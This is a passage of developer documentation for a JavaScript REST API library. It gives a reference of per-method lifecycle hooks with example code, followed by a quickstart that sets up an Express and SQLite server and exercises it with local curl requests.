      context.inputRecord.data.attributes.created_at = new Date().toISOString();
    }
  }
}
```

### beforeDataPost

**When**: Immediately after `beforeData`, post-specific  
**Context**: Same as `beforeData`  
**What can be changed**: Same as `beforeData`

### afterData

**When**: After the resource is created in the database  
**Purpose**: Trigger side effects, create related records

**Context contains**:
- All previous context properties
- `id` (string/number) - The ID of the created resource
- `newRecord` (object) - The raw database record

**What can be changed**:
- Can perform side effects (create related records, etc.)
- Can add properties to context for later hooks
- Should NOT modify `newRecord` directly

**Example**:
```javascript
hooks: {
  afterData: async ({ context, scopes }) => {
    if (context.method === 'post') {
      // Create a notification for new post
      await scopes.notifications.create({
        type: 'new_post',
        post_id: context.id,
        user_id: context.belongsToUpdates.author_id,
        created_at: new Date().toISOString()
      });
    }
  }
}
```

### afterDataPost

**When**: Immediately after `afterData`, post-specific  
**Context**: Same as `afterData`  
**What can be changed**: Same as `afterData`

### enrichRecord

**When**: After fetching the created record (if `returnFullRecord` is not 'no')  
**Purpose**: Modify response structure or add metadata

**IMPORTANT**: Do NOT use this hook to add/modify attributes. Use `enrichAttributes` instead.

**Context contains**:
- All previous context properties
- `record` (object) - The JSON:API formatted response
- `originalRecord` (object) - Backup of the record

**What can be changed**:
- Response structure (but NOT attributes)
- `record.meta` - Add metadata
- Should NOT modify attributes - use `enrichAttributes` hook instead

### afterCommit

**When**: After the transaction is committed (only if `shouldCommit` is true)  
**Purpose**: Trigger post-commit side effects like sending emails, webhooks

**Context**: All accumulated context  
**What can be changed**: Nothing - for side effects only

**Example**:
```javascript
hooks: {
  afterCommit: async ({ context, helpers }) => {
    if (context.method === 'post') {
      // Send email notification (safe to do after commit)
      await helpers.emailService.send({
        template: 'new_post',
        data: {
          postId: context.id,
          title: context.inputRecord.data.attributes.title
        }
      });
    }
  }
}
```

### afterRollback

**When**: If an error occurs and transaction is rolled back  
**Purpose**: Clean up any external resources, log failures

**Context**: All accumulated context plus error information  
**What can be changed**: Nothing - for cleanup/logging only

### finish

**When**: Before returning the response  
**Context**: All accumulated context  
**What can be changed**: Nothing - informational only

### finishPost

**When**: Immediately after `finish`, post-specific  
**Context**: Same as `finish`  
**What can be changed**: Nothing - informational only

## PUT Method Hooks

Used for completely replacing a resource.

### beforeData

**When**: Before replacing the resource  
**Purpose**: Validate replacement data, check permissions

**Context contains**:
- `method` (string) - "put"
- `simplified` (boolean) - Whether simplified mode is active (affects input/output format, not hook data)
- `schemaInfo` (object) - Compiled schema information
- `inputRecord` (object) - The JSON:API formatted input data
- `id` (string/number) - The ID from URL or input record
- `params` (object) - Original parameters
- `queryParams` (object) - Contains `fields`, `include` for response
- `transaction` (object) - Database transaction
- `shouldCommit` (boolean) - Whether to commit the transaction
- `db` (object) - Database connection
- `scopeName` (string) - Name of the current scope
- `returnRecordSetting` (object) - Settings for what to return
- `minimalRecord` (object) - Existing record for authorization
- `existingRelationships` (object) - Current hasMany/manyToMany relationships
- `auth` (object) - Authentication context if provided

**What can be changed**:
- `inputRecord.data.attributes` - Modify validated attributes before update
- `belongsToUpdates` - Modify foreign key values (but these are usually already merged into attributes)
- Can prevent certain field updates

**Note**: After validation, attributes are stored in `context.inputRecord.data.attributes`.

**Example**:
```javascript
hooks: {
  beforeData: async ({ context }) => {
    if (context.method === 'put' && context.inputRecord) {
      // Prevent changing the author (check if belongsTo relationship changed)
      const newAuthorId = context.belongsToUpdates?.author_id;
      const currentAuthorId = context.minimalRecord?.data?.relationships?.author?.data?.id;
      if (newAuthorId && newAuthorId !== currentAuthorId) {
        throw new Error('Cannot change post author');
      }
      
      // Add update timestamp
      context.inputRecord.data.attributes.updated_at = new Date().toISOString();
    }
  }
}
```

### beforeDataPut

**When**: Immediately after `beforeData`, put-specific  
**Context**: Same as `beforeData`  
**What can be changed**: Same as `beforeData`

### afterData

**When**: After the resource is updated and relationships are replaced  
**Purpose**: Handle relationship changes, trigger updates

**Context contains**:
- All previous context properties
- `updatedRecord` (object) - The updated database record
- `relationshipChanges` (object) - Details of relationship modifications

**What can be changed**:
- Can perform side effects
- Can clean up orphaned relationships
- Should NOT modify the database record

### afterDataPut

**When**: Immediately after `afterData`, put-specific  
**Context**: Same as `afterData`  
**What can be changed**: Same as `afterData`

### enrichRecord

**When**: After fetching the updated record (if `returnFullRecord` is not 'no')  
**Purpose**: Modify response structure or add metadata

**IMPORTANT**: Do NOT use this hook to add/modify attributes. Use `enrichAttributes` instead.

**Context contains**:
- All previous context properties
- `record` (object) - The JSON:API formatted response
- `originalRecord` (object) - Backup of the record

**What can be changed**:
- Response structure (but NOT attributes)
- `record.meta` - Add metadata
- Should NOT modify attributes - use `enrichAttributes` hook instead

### enrichRecordWithRelationships

**When**: After basic enrichment  
**Context**: Same as `enrichRecord`  
**What can be changed**:
- Can modify relationship data
- Can add relationship metadata

### afterCommit

**When**: After the transaction is committed  
**Context**: All accumulated context  
**What can be changed**: Nothing - for side effects only

### afterRollback

**When**: If an error occurs and transaction is rolled back  
**Context**: All accumulated context plus error information  
**What can be changed**: Nothing - for cleanup only

### finish

**When**: Before returning the response  
**Context**: All accumulated context  
**What can be changed**: Nothing - informational only

### finishPut

**When**: Immediately after `finish`, put-specific  
**Context**: Same as `finish`  
**What can be changed**: Nothing - informational only

## PATCH Method Hooks

Used for partially updating a resource.

### beforeData

**When**: Before partially updating the resource  
**Purpose**: Validate partial updates, compute derived values

**Context contains**:
- `method` (string) - "patch"
- `simplified` (boolean) - Whether simplified mode is active (affects input/output format, not hook data)
- `schemaInfo` (object) - Compiled schema information
- `inputRecord` (object) - The JSON:API formatted input data (partial)
- `id` (string/number) - The ID from URL or input record
- `params` (object) - Original parameters
- `queryParams` (object) - Contains `fields`, `include` for response
- `transaction` (object) - Database transaction
- `shouldCommit` (boolean) - Whether to commit the transaction
- `db` (object) - Database connection
- `scopeName` (string) - Name of the current scope
- `returnRecordSetting` (object) - Settings for what to return
- `minimalRecord` (object) - Existing record for authorization
- `auth` (object) - Authentication context if provided

**What can be changed**:
- `inputRecord.data.attributes` - Modify validated attributes before update
- `belongsToUpdates` - Modify foreign key values (if any)
- Can add computed values or prevent updates

**Note**: For PATCH, `context.inputRecord.data.attributes` contains only the fields being updated. Use `context.minimalRecord.data.attributes` to access the complete current record.

**Example**:
```javascript
hooks: {
  beforeData: async ({ context }) => {
    if (context.method === 'patch' && context.inputRecord) {
      // If status is being changed to published, set publish date
      if (context.inputRecord.data.attributes.status === 'published' && 
          context.minimalRecord?.data?.attributes?.status !== 'published') {
        context.inputRecord.data.attributes.published_at = new Date().toISOString();
      }
      
      // Always update the modified timestamp
      context.inputRecord.data.attributes.updated_at = new Date().toISOString();
    }
  }
}
```

### beforeDataPatch

**When**: Immediately after `beforeData`, patch-specific  
**Context**: Same as `beforeData`  
**What can be changed**: Same as `beforeData`

### afterData

**When**: After the partial update is applied  
**Purpose**: React to specific changes, trigger conditional side effects

**Context contains**:
- All previous context properties
- `updatedRecord` (object) - The updated database record
- `relationshipChanges` (object) - Details of any relationship modifications

**What can be changed**:
- Can perform side effects based on what changed
- Should NOT modify the database record

### afterDataPatch

**When**: Immediately after `afterData`, patch-specific  
**Context**: Same as `afterData`  
**What can be changed**: Same as `afterData`

### enrichRecord

**When**: After fetching the updated record (if `returnFullRecord` is not 'no')  
**Purpose**: Modify response structure or add metadata

**IMPORTANT**: Do NOT use this hook to add/modify attributes. Use `enrichAttributes` instead.

**Context contains**:
- All previous context properties
- `record` (object) - The JSON:API formatted response
- `originalRecord` (object) - Backup of the record

**What can be changed**:
- Response structure (but NOT attributes)
- `record.meta` - Add metadata
- Should NOT modify attributes - use `enrichAttributes` hook instead

### enrichRecordWithRelationships

**When**: After basic enrichment  
**Context**: Same as `enrichRecord`  
**What can be changed**:
- Can modify relationship data
- Can add relationship metadata

### afterCommit

**When**: After the transaction is committed  
**Context**: All accumulated context  
**What can be changed**: Nothing - for side effects only

### afterRollback

**When**: If an error occurs and transaction is rolled back  
**Context**: All accumulated context plus error information  
**What can be changed**: Nothing - for cleanup only

### finish

**When**: Before returning the response  
**Context**: All accumulated context  
**What can be changed**: Nothing - informational only

### finishPatch

**When**: Immediately after `finish`, patch-specific  
**Context**: Same as `finish`  
**What can be changed**: Nothing - informational only

## DELETE Method Hooks

Used for removing resources.

### beforeData

**When**: Before deleting the resource  
**Purpose**: Validate deletion, check for dependencies

**Context contains**:
- `method` (string) - "delete"
- `schemaInfo` (object) - Compiled schema information
- `id` (string/number) - The ID of the resource to delete
- `transaction` (object) - Database transaction
- `shouldCommit` (boolean) - Whether to commit the transaction
- `db` (object) - Database connection
- `scopeName` (string) - Name of the current scope
- `minimalRecord` (object) - Record fetched for authorization checks
- `auth` (object) - Authentication context if provided

**What can be changed**:
- Can throw errors to prevent deletion
- Can add properties to context for later hooks
- Cannot modify the deletion itself

**Example**:
```javascript
hooks: {
  beforeData: async ({ context }) => {
    if (context.method === 'delete') {
      // Check if post has comments
      const commentCount = await context.db('comments')
        .where('post_id', context.id)
        .count('* as count')
        .first();
      
      if (commentCount.count > 0) {
        throw new Error('Cannot delete post with comments');
      }
    }
  }
}
```

### beforeDataDelete

**When**: Immediately after `beforeData`, delete-specific  
**Context**: Same as `beforeData`  
**What can be changed**: Same as `beforeData`

### afterData

**When**: After the resource is deleted from the database  
**Purpose**: Clean up related data, log deletions

**Context contains**:
- All previous context properties
- `deletedCount` (number) - Number of records deleted (should be 1)
- `deletedRecord` (object) - The record that was deleted

**What can be changed**:
- Can perform cascading deletes or cleanup
- Can log the deletion
- Cannot undo the deletion

**Example**:
```javascript
hooks: {
  afterData: async ({ context, scopes }) => {
    if (context.method === 'delete') {
      // Log the deletion
      await scopes.audit_logs.create({
        action: 'delete',
        resource_type: 'posts',
        resource_id: context.id,
        user_id: context.auth?.userId,
        timestamp: new Date().toISOString()
      });
      
      // Clean up orphaned images
      await context.db('post_images')
        .where('post_id', context.id)
        .delete();
    }
  }
}
```

### afterDataDelete

**When**: Immediately after `afterData`, delete-specific  
**Context**: Same as `afterData`  
**What can be changed**: Same as `afterData`

### afterCommit

**When**: After the transaction is committed  
**Purpose**: Trigger post-deletion side effects

**Context**: All accumulated context  
**What can be changed**: Nothing - for side effects only

### afterRollback

**When**: If an error occurs and transaction is rolled back  
**Context**: All accumulated context plus error information  
**What can be changed**: Nothing - for cleanup only

### finish

**When**: Before returning the response (typically empty for DELETE)  
**Context**: All accumulated context  
**What can be changed**: Nothing - informational only

### finishDelete

**When**: Immediately after `finish`, delete-specific  
**Context**: Same as `finish`  
**What can be changed**: Nothing - informational only

## Special Hooks

### enrichAttributes

The `enrichAttributes` hook is the correct way to add or modify attributes on records. This hook is called for ALL records - both main records and included/related records.

**When**: After records are fetched and before they are returned  
**Purpose**: Add computed fields, transform attribute values, enhance record data

**Context contains**:
- `attributes` (object) - The record's attributes that should be modified
- `parentContext` (object) - The parent context from the calling method (contains method, queryParams, etc.)
- `computedFields` (object) - Computed field definitions from schema
- `requestedComputedFields` (array) - Which computed fields were requested
- `scopeName` (string) - Name of the current scope
- `helpers` (object) - Helper functions
- `api` (object) - API instance

**What can be changed**:
- Modify `context.attributes` to add new properties
- Transform existing attribute values
- Remove sensitive attributes

**Important**:
- This hook is called for EVERY record (main and included)
- Works with both single records and collections
- Modify `context.attributes` directly

**Example**:
```javascript
// In global customize()
api.customize({
  hooks: {
    enrichAttributes: async ({ context }) => {
      // Add computed fields based on scope
      if (context.scopeName === 'posts') {
        context.attributes.wordCount = context.attributes.content?.split(' ').length || 0;
        context.attributes.readingTime = Math.ceil(context.attributes.wordCount / 200) + ' min';
        context.attributes.preview = context.attributes.content?.substring(0, 150) + '...';
      }
      
      if (context.scopeName === 'users') {
        // Hide sensitive data
        delete context.attributes.password;
        delete context.attributes.resetToken;
        
        // Add display name
        context.attributes.displayName = `${context.attributes.firstName} ${context.attributes.lastName}`;
      }
    }
  }
});

// In resource-specific extras
api.addScope('articles', {}, {
  hooks: {
    enrichAttributes: async ({ context }) => {
      // This only runs for articles
      context.attributes.isPublished = context.attributes.status === 'published';
      context.attributes.isNew = new Date() - new Date(context.attributes.created_at) < 7 * 24 * 60 * 60 * 1000;
      
      // Format dates for display
      context.attributes.formattedDate = new Date(context.attributes.created_at).toLocaleDateString();
    }
  }
});
```

### knexQueryFiltering

The `knexQueryFiltering` hook is called during QUERY operations to apply filter conditions. This is a special hook that allows complex query modifications.

**When**: During `dataQuery` execution, before sorting and pagination  
**Purpose**: Apply filters, add JOINs, modify query conditions

**Context contains**:
- `knexQuery` (object) - Temporary object with:
  - `query` (knex query builder) - The active query being built
  - `filters` (object) - Filter parameters from request
  - `searchSchema` (object) - Schema defining searchable fields
  - `scopeName` (string) - Current resource scope
  - `tableName` (string) - Database table name
  - `db` (object) - Database connection
- All other standard query context properties

The REST API Knex Plugin registers three sub-hooks that run in sequence:

#### 1. polymorphicFiltersHook

**Purpose**: Handles filtering on polymorphic relationships  
**What it does**:
- Detects polymorphic filter fields (e.g., `commentable.title`)
- Adds appropriate JOINs for each polymorphic type
- Builds WHERE conditions with proper type checking

**Example**:
```javascript
// This is handled automatically by the plugin
// When filtering: ?filters[commentable.title]=Hello
// It generates SQL like:
// LEFT JOIN posts ON (comments.commentable_type = 'posts' AND comments.commentable_id = posts.id)
// WHERE posts.title = 'Hello'
```

#### 2. crossTableFiltersHook

**Purpose**: Handles filtering on cross-table fields  
**What it does**:
- Detects cross-table filter fields (e.g., `author.name`)
- Adds JOINs to related tables
- Qualifies field names to avoid ambiguity

**Example**:
```javascript
// This is handled automatically by the plugin
// When filtering: ?filters[author.name]=John
// It generates SQL like:
// INNER JOIN users ON posts.author_id = users.id
// WHERE users.name = 'John'
```

#### 3. basicFiltersHook

**Purpose**: Handles simple filters on the main table  
**What it does**:
- Processes standard field filters
- Handles special operators (contains, starts_with, etc.)
- Applies filters to non-joined fields

**Custom Filter Hook Example**:
```javascript
hooks: {
  knexQueryFiltering: async ({ context }) => {
    if (context.knexQuery && context.knexQuery.filters) {
      const { query, filters, tableName } = context.knexQuery;
      
      // Add custom filter logic
      if (filters.special_filter) {
        query.where(function() {
          this.where(`${tableName}.status`, 'active')
              .orWhere(`${tableName}.featured`, true);
        });
      }
    }
  }
}
```

## Hook Best Practices

### 1. Hook Order Matters

Hooks run in registration order. Consider dependencies between hooks:

```javascript
hooks: {
  beforeData: [
    async ({ context }) => {
      // Validation runs first
      if (!context.inputRecord?.data?.attributes?.title) {
        throw new Error('Title is required');
      }
    },
    async ({ context }) => {
      // Enrichment runs second, after validation
      context.inputRecord.data.attributes.slug = context.inputRecord.data.attributes.title
        .toLowerCase()
        .replace(/\s+/g, '-');
    }
  ]
}
```

### 2. Use Proper Hook Placement

If using addHook directly (less common), you can control placement:

```javascript
// Use afterPlugin to ensure your hook runs after the plugin's hooks
api.addHook('beforeData', 'myHook', { afterPlugin: 'rest-api-knex' }, handler);
```

### 3. Context Mutation Guidelines

- **DO**: Modify allowed properties as documented
- **DON'T**: Change properties marked as read-only
- **DO**: Add custom properties for communication between hooks
- **DON'T**: Remove required properties

### 4. Error Handling

Throwing an error in any hook will:
- Stop the operation
- Trigger rollback for write operations
- Return the error to the client

```javascript
hooks: {
  beforeData: async ({ context }) => {
    if (context.inputRecord?.data?.attributes?.price < 0) {
      throw new RestApiValidationError('Price cannot be negative', {
        fields: ['data.attributes.price']
      });
    }
  }
}
```

### 5. Performance Considerations

- Keep `enrichRecord` hooks lightweight for queries with many results
- Use database transactions appropriately
- Batch operations when possible
- Avoid N+1 queries in hooks

### 6. Transaction Safety

For write operations:
- Use `afterCommit` for external side effects (emails, webhooks)
- Use `afterData` for database-related side effects
- Always handle `afterRollback` for cleanup

### 7. Scope-Specific Hooks

Add hooks to specific scopes to avoid checking in every hook:

```javascript
// Better: Add hooks in the scope's extras parameter
api.addScope('posts', {}, {
  hooks: {
    beforeData: async ({ context }) => {
      // This only runs for posts
    }
  }
});

// Less ideal: Check scopeName in global hooks
hooks: {
  beforeData: async ({ context }) => {
    if (context.scopeName === 'posts') {
      // ...
    }
  }
}
```

### 8. Hook Communication

Use context properties to communicate between hooks:

```javascript
hooks: {
  beforeData: async ({ context }) => {
    context.customData = { processed: true };
  },
  
  afterData: async ({ context }) => {
    if (context.customData?.processed) {
      // React to first hook
    }
  }
}

## System-Wide Hooks

These hooks are managed by the hooked-api framework and are triggered during core API operations.

### plugin:installed

**When**: After a plugin is successfully installed  
**Purpose**: React to plugin installations, set up inter-plugin communication

**Context contains**:
- `pluginName` (string) - Name of the installed plugin
- `pluginOptions` (object) - Options passed to the plugin
- `plugin` (object) - The plugin object itself (informational only)

**What can be changed**: Nothing - this is an informational hook

**Example**:
```javascript
hooks: {
  'plugin:installed': async ({ context }) => {
    console.log(`Plugin ${context.pluginName} installed with options:`, context.pluginOptions);
  }
}
```

### scope:added

**When**: After a scope is added to the API  
**Purpose**: Initialize scope-specific settings, validate configurations, compile schemas

**Context contains**:
- `scopeName` (string) - Name of the added scope
- `scopeOptions` (object) - Immutable copy of initial options
- `scopeExtras` (object) - Immutable copy of initial extras
- `vars` (proxy) - Proxy for current scope vars (can be mutated)
- `helpers` (proxy) - Proxy for current scope helpers (can be mutated)

**What can be changed**: 
- Can add/modify scope vars through the proxy
- Can add/modify scope helpers through the proxy
- Cannot modify scopeOptions (frozen after hook runs)

**Example**:
```javascript
hooks: {
  'scope:added': async ({ context }) => {
    // Add a default value to scope vars
    context.vars.defaultPageSize = 20;
    
    // Add a helper function
    context.helpers.formatDate = (date) => new Date(date).toISOString();
  }
}
```

### method:api:added

**When**: After an API method is added  
**Purpose**: Wrap or modify API method handlers

**Context contains**:
- `methodName` (string) - Name of the added method
- `handler` (function) - The method handler function

**What can be changed**:
- `handler` - Can wrap or replace the handler function

**Example**:
```javascript
hooks: {
  'method:api:added': async ({ context }) => {
    const originalHandler = context.handler;
    context.handler = async (params) => {
      console.log(`Calling ${context.methodName}`);
      const result = await originalHandler(params);
      console.log(`${context.methodName} completed`);
      return result;
    };
  }
}
```

### method:scope:adding

**When**: Before adding a scope method  
**Purpose**: Validate or modify scope methods before they're registered

**Context contains**:
- `methodName` (string) - Name of the method being added
- `handler` (function) - The method handler function

**What can be changed**:
- `handler` - Can wrap or replace the handler function before it's added

### method:scope:added

**When**: After a scope method is added  
**Purpose**: React to scope method additions

**Context contains**:
- `methodName` (string) - Name of the added method
- `handler` (function) - The method handler function

**What can be changed**: Nothing - this is an informational hook

```

---

[Back to Guide](./README.md)

# Quickstart


## Make a new npm project and install the basic NPM modules

```bash
mkdir quickstart-api
cd quickstart-api
npm init
npm install json-rest-api
npm install knex
npm install better-sqlite3
npm install express
```

These modules are all defined as peer dependencies and will be 

## Use ESM syntax for importing

Make sure package.json has `type: "module"` in it

## Create a basic file

```javascript
//
// index.js
//
import { RestApiPlugin, RestApiKnexPlugin, ExpressPlugin } from 'json-rest-api'; // Added: ExpressPlugin
import { Api } from 'hooked-api';
import knexLib from 'knex';
import util from 'util';
import express from 'express'; // Added: Express

// Utility used throughout this guide
const inspect = (obj) => util.inspect(obj, { depth: 8 })

// Create a Knex instance connected to SQLite in-memory database
const knex = knexLib({
  client: 'better-sqlite3',
  connection: {
    filename: ':memory:'
  },
  useNullAsDefault: true
});

// Create API instance
const api = new Api({ name: 'book-catalog-api' });

// Install plugins
await api.use(RestApiPlugin); // URLs auto-detected // Public URL might be different in case of proxies etc.
await api.use(RestApiKnexPlugin, { knex });
await api.use(ExpressPlugin, {  mountPath: '/api' }); // Added: Express Plugin

/// *** ...programmatic calls here... ***

// Create the express server and add the API's routes 
const app = express();
app.use(api.http.express.router);
app.use(api.http.express.notFoundRouter);

app.listen(3000, () => {
  console.log('Express server started on port 3000. API available at http://localhost:3000/api');
}).on('error', (err) => {
  console.error('Failed to start server:', err);
  process.exit(1)
});
```

## Add a couple of resources

In the snippet above, add a couple of related resourcs:

```javascript
// Define publishers resource
await api.addResource('publishers', {
  schema: {
    name: { type: 'string', required: true, max: 255, search: true, indexed: true },
  },
  relationships: {
    // A publisher has many authors
    authors: { hasMany: 'authors', foreignKey: 'publisher_id' },
  },
  searchSchema: { // Adding search schema for publishers
    name: { type: 'string', filterOperator: 'like' }
  }
});
await api.resources.publishers.createKnexTable();

// Define authors resource, which belongs to a publisher
await api.addResource('authors', {
  schema: {
    name: { type: 'string', required: true, max: 100, search: true },
    surname: { type: 'string', required: true, max: 100, search: true },
    publisher_id: { type: 'id', belongsTo: 'publishers', as: 'publisher', nullable: true }
  },
  searchSchema: { // Adding search schema for authors
    name: { type: 'string', filterOperator: 'like' },
    surname: { type: 'string', filterOperator: 'like' },
    publisher: { type: 'id', actualField: 'publisher_id', nullable: true },
    publisherName: { type: 'string', actualField: 'publishers.name', filterOperator: 'like' } // Cross-table search
  }
});
await api.resources.authors.createKnexTable();
```

## Run the program

```bash
$ node index.js 
2025-08-01T00:25:50.730Z [INFO] [book-catalog-api] Installing plugin 'rest-api'
2025-08-01T00:25:50.736Z [INFO] [book-catalog-api] Plugin 'rest-api' installed successfully { duration: '2ms' }
2025-08-01T00:25:50.736Z [INFO] [book-catalog-api] Installing plugin 'rest-api-knex' { options: '[Object with methods]' }
2025-08-01T00:25:50.745Z [INFO] [book-catalog-api:plugin:rest-api-knex] Database capabilities detected: { database: 'SQLite', version: '3.50.2', windowFunctions: true }
2025-08-01T00:25:50.746Z [INFO] [book-catalog-api:plugin:rest-api-knex] RestApiKnexPlugin installed - basic CRUD operations ready
2025-08-01T00:25:50.747Z [INFO] [book-catalog-api] Plugin 'rest-api-knex' installed successfully { duration: '10ms' }
2025-08-01T00:25:50.747Z [INFO] [book-catalog-api] Installing plugin 'express' { options: { mountPath: '/api' } }
2025-08-01T00:25:50.750Z [INFO] [book-catalog-api:plugin:express] Express plugin initialized successfully
2025-08-01T00:25:50.751Z [INFO] [book-catalog-api] Plugin 'express' installed successfully { duration: '4ms' }
2025-08-01T00:25:50.751Z [INFO] [book-catalog-api] Scope 'publishers' added successfully
2025-08-01T00:25:50.758Z [INFO] [book-catalog-api:global] Routes registered for scope 'publishers'
2025-08-01T00:25:50.763Z [INFO] [book-catalog-api] Scope 'authors' added successfully
2025-08-01T00:25:50.765Z [INFO] [book-catalog-api:global] Routes registered for scope 'authors'
Express server started on port 3000. API available at http://localhost:3000/api
```

Success!

## Try the API programmatically

Stop the server (CTRL-C).
Now, just after the creation of the knex table for authors, make some queries programmatically:

```javascript
// Method 1: Simplified mode without inputRecord (most concise)
const penguinResult = await api.resources.publishers.post({
  name: 'Penguin Random House'
});
console.log('Created publisher:', inspect(penguinResult));

// Method 2: Simplified mode with inputRecord (explicit)
const harperResult = await api.resources.publishers.post({
  inputRecord: {
    name: 'HarperCollins'
  }
});

// Method 3: Full JSON:API mode (standards compliant)
const oxfordResult = await api.resources.publishers.post({
  inputRecord: {
    data: {
      type: 'publishers',
      attributes: {
        name: 'Oxford University Press'
      }
    }
  },
  simplified: false
});
console.log('JSON:API response:', inspect(oxfordResult));

// Create an author linked to the first publisher (simplified)
const authorResult = await api.resources.authors.post({
  name: 'George',
  surname: 'Orwell',
  publisher_id: penguinResult.id
});
console.log('Created author:', inspect(authorResult));

// Get all publishers
const allPublishers = await api.resources.publishers.query({});
console.log('All publishers:', inspect(allPublishers));

// Get publisher with included authors
const publisherWithAuthors = await api.resources.publishers.get({
  id: penguinResult.id,
  include: ['authors']
});
console.log('Publisher with authors:', inspect(publisherWithAuthors));

// Search authors by name
const searchResult = await api.resources.authors.query({
  filter: { name: 'George' }
});
console.log('Search results:', inspect(searchResult));

// Update an author
const updateResult = await api.resources.authors.patch({
  id: authorResult.id,
  surname: 'Orwell (Eric Blair)'
});
console.log('Updated author:', inspect(updateResult));
```

The API supports three different ways to interact with resources programmatically:

1. **Simplified mode without inputRecord** (default): Pass attributes directly as top-level properties. This is the most concise approach.
2. **Simplified mode with inputRecord**: Explicitly wrap attributes in an `inputRecord` property. Still returns simplified objects.
3. **Full JSON:API mode**: Set `simplified: false` to use the complete JSON:API specification format for both requests and responses. This provides full standards compliance and access to all JSON:API features.

Restart the server, and watch the output:

```text
Created publisher: { id: '1', name: 'Penguin Random House', authors_ids: [] }
JSON:API response: {
  data: {
    type: 'publishers',
    id: '3',
    attributes: { name: 'Oxford University Press' },
    relationships: { authors: { data: [] } },
    links: { self: '/api/publishers/3' }
  },
  links: { self: '/api/publishers/3' }
}
Created author: { id: '1', name: 'George', surname: 'Orwell', publisher_id: '1' }
All publishers: {
  data: [
    { id: '1', name: 'Penguin Random House', authors_ids: [ '1' ] },
    { id: '2', name: 'HarperCollins', authors_ids: [] },
    { id: '3', name: 'Oxford University Press', authors_ids: [] }
  ],
  links: { self: '/api/publishers' }
}
Publisher with authors: { id: '1', name: 'Penguin Random House', authors_ids: [ '1' ] }
Search results: {
  data: [ { id: '1', name: 'George', surname: 'Orwell', publisher_id: '1' } ],
  links: { self: '/api/authors' }
}
Updated author: {
  id: '1',
  name: 'George',
  surname: 'Orwell (Eric Blair)',
  publisher_id: '1'
}
```

## Try the API via cURL

With the server running on port 3000 and the data created programmatically above, you can interact with the API using cURL:

```bash

# Get all publishers
curl http://localhost:3000/api/publishers

# Get all authors
curl http://localhost:3000/api/authors

# Get a specific publisher with included authors
curl "http://localhost:3000/api/publishers/1?include=authors"

# Search authors by name
curl "http://localhost:3000/api/authors?filter[name]=George"

# Search authors by publisher name (cross-table search)
curl "http://localhost:3000/api/authors?filter[publisherName]=Penguin"

# Get authors with sparse fields (only name and surname)
curl "http://localhost:3000/api/authors?fields[authors]=name,surname"

# Update an author
curl -X PATCH http://localhost:3000/api/authors/1 \
  -H "Content-Type: application/vnd.api+json" \
  -d '{
    "data": {
      "type": "authors",
      "id": "1",
      "attributes": {
        "surname": "Orwell (Blair)"
      }
    }
  }'

# Create a new author
curl -X POST http://localhost:3000/api/authors \
  -H "Content-Type: application/vnd.api+json" \
  -d '{
    "data": {
      "type": "authors",
      "attributes": {
        "name": "Jane",
        "surname": "Austen"
      },
      "relationships": {
        "publisher": {
          "data": { "type": "publishers", "id": "2" }
        }
      }
    }
  }'

# Update the new author's surname
curl -X PATCH http://localhost:3000/api/authors/2 \
  -H "Content-Type: application/vnd.api+json" \
  -d '{
    "data": {
      "type": "authors",
      "id": "2",
      "attributes": {
        "surname": "Austen (1775-1817)"
      }
    }
  }'

# Update author's relationship to a different publisher
curl -X PATCH http://localhost:3000/api/authors/2 \
  -H "Content-Type: application/vnd.api+json" \
  -d '{
    "data": {
      "type": "authors",
      "id": "2",
      "relationships": {
        "publisher": {
          "data": { "type": "publishers", "id": "1" }
        }
      }
    }
  }'

# Delete the newly created author
curl -X DELETE http://localhost:3000/api/authors/2

# Get publishers with pagination
curl "http://localhost:3000/api/publishers?page[offset]=0&page[limit]=10"

# Sort authors by surname descending
curl "http://localhost:3000/api/authors?sort=-surname"
```

## Read the guide and party!

You've successfully set up a basic JSON REST API! This quickstart covered the essentials, but there's much more to explore.

Check out the [full guide](./GUIDE) to learn about:
- Advanced relationships (many-to-many, polymorphic)
- Authentication and authorization
- Hooks and middleware
- Custom validation
- Pagination strategies
- Performance optimization
- And much more!

Happy coding!
